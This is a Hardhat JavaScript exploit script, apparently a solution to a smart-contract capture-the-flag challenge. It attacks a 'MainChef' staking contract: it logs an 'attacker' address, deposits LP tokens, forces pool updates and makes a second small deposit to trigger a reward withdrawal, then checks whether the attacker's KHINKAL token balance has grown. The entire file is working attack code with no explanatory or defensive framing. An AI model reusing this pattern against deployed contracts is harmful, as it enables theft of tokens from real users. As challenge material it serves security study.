const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
  const provider = new ethers.providers.Web3Provider(network.provider);

  const [deployer] = await ethers.getSigners();
  console.log("[*] attacker address:", deployer.address);
  console.log("[*] attacker balance:", (await deployer.getBalance()).toString());

  const instanceAddress = process.env.INSTANCE_ADDRESS;
  console.log("[*] instance address:", instanceAddress);

  const MainChef = await hre.ethers.getContractFactory("MainChef");
  const mainchef = await MainChef.attach(instanceAddress);

  let pool = await mainchef.poolInfo(0);
  console.log("[*] pool:");
  console.log(pool);


  console.log("[*] updating pool..")
  let tx = await mainchef.updatePool(0);
  await tx.wait();
  console.log("[*] pool:");
  console.log(pool);


  let lpTokenAddress = pool.lpToken;
  let LPToken = await hre.ethers.getContractFactory("LPToken");
  let lptoken = LPToken.attach(lpTokenAddress);

  console.log("[*] pool balance:", (await lptoken.balanceOf(instanceAddress)).toString());
  console.log("[*] attacker balance (in LP):", (await lptoken.balanceOf(deployer.address)).toString());

  let khinkalAddress = await mainchef.khinkal();
  let KhinkalToken = await hre.ethers.getContractFactory("KhinkalToken");
  let khinkal = await KhinkalToken.attach(khinkalAddress);

  console.log("[*] chef balance (in KHINKAL):", (await khinkal.balanceOf(instanceAddress)).toString());
  console.log("[*] attacker balance (in KHINKAL):", (await khinkal.balanceOf(deployer.address)).toString());

  let khinkalPerBlock = await mainchef.khinkalPerBlock();
  console.log("[*] KHINKAL per block:", khinkalPerBlock.toString());

  let totalAllocPoint = await mainchef.totalAllocPoint();

  tx = await lptoken.approve(instanceAddress, 100000);
  await tx.wait();

  console.log("[*] depositing some LP..")
  tx = await mainchef.deposit(0, 1336);
  await tx.wait();

  console.log("[*] updating pool..")
  tx = await mainchef.updatePool(0);
  await tx.wait();

  pool = await mainchef.poolInfo(0);
  console.log("[*] pool:");
  console.log(pool);


  let user = await mainchef.userInfo(0, deployer.address);
  console.log("[*] user:")
  console.log(user);

  let pendingReward = user.amount * pool.accKhinkalPerShare / 1e12;
  console.log("[*] pending reward:", pendingReward);
  console.log(pendingReward <= pool.lastKhinkalReward)


  console.log("[*] depositing some LP to trigger withdraw..")
  tx = await mainchef.deposit(0, 1);
  await tx.wait();

  console.log("[*] chef balance (in KHINKAL):", (await khinkal.balanceOf(instanceAddress)).toString());
  console.log("[*] attacker balance (in KHINKAL):", (await khinkal.balanceOf(deployer.address)).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
